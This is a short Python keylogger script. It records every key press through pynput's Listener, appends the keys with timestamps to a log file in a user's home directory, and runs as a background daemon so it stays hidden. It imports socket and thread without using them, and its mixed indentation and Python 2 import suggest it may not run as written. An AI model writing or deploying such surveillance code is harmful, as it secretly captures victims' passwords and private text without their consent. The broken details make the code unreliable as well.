from pynput.keyboard import Listener
import logging
import daemon
import socket
import thread

logging.basicConfig(format="%(asctime)s:%(message)s")
file_logger = logging.FileHandler("/home/user0308/logger.log", "a")
logger = logging.getLogger()
logger.addHandler(file_logger)
logger.setLevel(logging.DEBUG)


def press(key):
    logging.info(key)

def work():
	with Listener(on_press = press) as listener:
        	listener.join()

with daemon.DaemonContext(files_preserve=[file_logger.stream.fileno()]):
		work()	

